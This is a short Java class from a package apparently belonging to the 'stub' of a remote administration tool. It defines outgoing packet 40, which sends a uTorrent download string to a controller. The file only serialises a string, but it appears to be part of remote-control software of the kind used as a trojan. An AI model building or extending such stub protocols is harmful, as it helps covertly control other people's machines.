package com.redpois0n.stub.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet40UTorrentDownload extends AbstractOutgoingPacket {

	private String torrent;
	
	public Packet40UTorrentDownload(String torrent) {
		this.torrent = torrent;
	}
	
	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(torrent);
	}

	@Override
	public byte getPacketId() {
		return 40;
	}

}
